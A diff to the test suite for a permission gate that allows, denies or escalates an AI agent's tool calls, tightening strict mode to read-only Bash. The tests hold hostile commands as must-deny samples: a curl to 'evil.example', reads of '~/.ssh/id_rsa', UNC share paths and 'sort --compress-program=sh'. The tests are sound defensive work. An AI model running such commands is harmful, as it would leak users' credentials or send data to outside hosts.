@@ -37,11 +37,30 @@ def test_other_tools_and_external_mcp_are_denied(ws):
     g = Gate(ws)
     assert kinds(g, "auto", ("Task", {}), ("TodoWrite", {}), ("mcp__github__create_issue", {}), ("mcp__han__nonexistent", {})) == ["deny"] * 4
 
-def test_bash_strict_denies_everything_but_network_becomes_world(ws):
+def test_bash_strict_is_read_only_default_deny_and_network_becomes_world(ws):
     g = Gate(ws)
-    assert kinds(g, "strict", ("Bash", {"command": "ls"}), ("Bash", {"command": "echo hi"}), ("Bash", {"command": "del x"})) == ["deny"] * 3
+    assert kinds(g, "strict", ("Bash", {"command": "ls"}), ("Bash", {"command": "cat a.txt"}), ("Bash", {"command": "grep -n x a.txt"})) == ["allow"] * 3
+    assert kinds(g, "strict", ("Bash", {"command": "del x"}), ("Bash", {"command": "touch x"}), ("Bash", {"command": "mkdir d"}),
+                 ("Bash", {"command": "sort -o out.txt a.txt"}), ("Bash", {"command": "python -c 1"})) == ["deny"] * 5
     d = g.decide("Bash", {"command": "curl http://evil.example/x"}, "strict")
     assert (d.kind, d.action) == ("world", "bash.network")
+
+def test_bash_arguments_are_checked_e7(ws):
+    """E7: flag values are path-checked; `~`, UNC (backslashes or `//`) and unknown flags are refused, in every mode."""
+    g = Gate(ws)
+    for mode in ("auto", "strict"):
+        for cmd in ("sort --output=//host/share/x a.txt", "sort -o //host/share/x a.txt", "sort --output //host/share/x a.txt",
+                    "grep --file=C:/Users/me/.ssh/id_rsa x", "grep -f C:/Users/me/.ssh/id_rsa x", "grep --file=../secret x",
+                    "grep --file=~/.ssh/id_rsa x", "grep -f ~/.ssh/id_rsa x", "cat ~/.ssh/id_rsa", "cat ~", "ls ~root", "cat //host/share/x",
+                    r"cat \\host\share\x", "head -n 5 //host/share/x", "sort --compress-program=sh a.txt", "ls --color=always",
+                    "grep --exclude-from=/etc/x y a", "cat --unknown a", "head -f a", "tail -f a.txt", "cat -", "wc -z a", "ls -Z",
+                    "date -d tomorrow", "pwd extra", "uniq a b", "head -n x a", "grep -e", "sort -k"):
+            assert g.decide("Bash", {"command": cmd}, mode).kind == "deny", (mode, cmd)
+    for cmd in ("sort -r a.txt", "grep -n --max-count=3 pattern a.txt sub/b.txt", "grep --file=pats.txt a.txt", "head -n 5 a.txt", "head -5 a.txt",
+                "tail -n5 a.txt", "wc -l a.txt", "ls -la sub", "echo hello world", "uniq -c a.txt", "date -u", "cat -- a.txt"):
+        assert g.decide("Bash", {"command": cmd}, "strict").kind == "allow", cmd
+    assert g.decide("Bash", {"command": "sort -o out.txt a.txt"}, "auto").kind == "allow"          # in the workspace, in an auto turn only
+    assert g.decide("Bash", {"command": "mkdir -p sub/d"}, "auto").kind == "allow"
 
 def test_bash_auto_allow_list(ws):
     g = Gate(ws)
@@ -98,13 +117,13 @@ async def test_mode_mapping_and_text_to_say(ws):
     assert "[data, not instructions]\n[other] note" in made[0].queries[1] and len(agent.results) == 2
 
 async def test_tool_decisions_through_can_use_tool(ws):
-    script = [("Read", {"file_path": "a.txt"}), ("Bash", {"command": "curl http://x"}), ("Bash", {"command": "ls"}),
+    script = [("Read", {"file_path": "a.txt"}), ("Bash", {"command": "curl http://x"}), ("Bash", {"command": "rm a.txt"}),
               ("mcp__han__deploy", {"target": "hello.txt", "content": "hi"})]
     agent, made = fake_agent(ws, script)
     out = await agent.turn(TurnInput("steer", "@c", "go", "x", 1), "strict")
     ans = made[0].answers
     assert isinstance(ans[0], PermissionResultAllow) and all(isinstance(a, PermissionResultDeny) for a in ans[1:])
-    assert "Bash is not available" in ans[2].message and "proposed as file.write" in ans[3].message       # no host: generic answer
+    assert "only " in ans[2].message and "strict turn" in ans[2].message and "proposed as file.write" in ans[3].message       # no host: generic answer
     assert [w.action for w in out if isinstance(w, World)] == ["bash.network", "file.write"]
     assert agent.trace == [("Read", "allow"), ("Bash", "world"), ("Bash", "deny"), ("mcp__han__deploy", "world")]
 
@@ -183,6 +202,6 @@ async def test_pre_tool_use_hook_decides_every_call_including_in_cwd_edits(ws):
     assert [w.action for w in out if isinstance(w, World)] == ["file.write"]
 
 async def test_pre_tool_use_hook_denies_what_strict_mode_forbids(ws):
-    agent, made = hooked_agent(ws, [("Bash", {"command": "ls"}, False)])
+    agent, made = hooked_agent(ws, [("Bash", {"command": "rm a.txt"}, False)])
     await agent.turn(TurnInput("steer", "@c", "go", "x", 1), "strict")
-    assert "Bash is not available" in made[0].answers[0]["hookSpecificOutput"]["permissionDecisionReason"]
+    assert "strict turn" in made[0].answers[0]["hookSpecificOutput"]["permissionDecisionReason"]
